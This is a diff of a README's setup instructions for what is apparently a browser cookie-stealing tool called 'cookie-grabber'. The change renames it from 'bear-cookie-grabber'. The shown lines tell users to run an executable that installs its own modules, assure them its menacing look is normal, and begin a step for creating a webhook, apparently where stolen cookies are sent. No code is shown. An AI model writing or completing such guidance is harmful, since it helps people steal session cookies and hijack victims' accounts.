@@ -63,8 +63,8 @@ Once you've downloaded the files extract the folder so it's no longer a .zip fil
 ### 2. Open The cookie-grabber. File:
 
 ```
-You dont need to install any modules opening this will install them for you. Then you can open the bear-cookie-grabber.exe which will
-open a terminal with the bear-cookie-grabber logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
+You dont need to install any modules opening this will install them for you. Then you can open the cookie-grabber.exe which will
+open a terminal with the cookie-grabber logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
 ```
 
 ### 3. Create A Webhook:
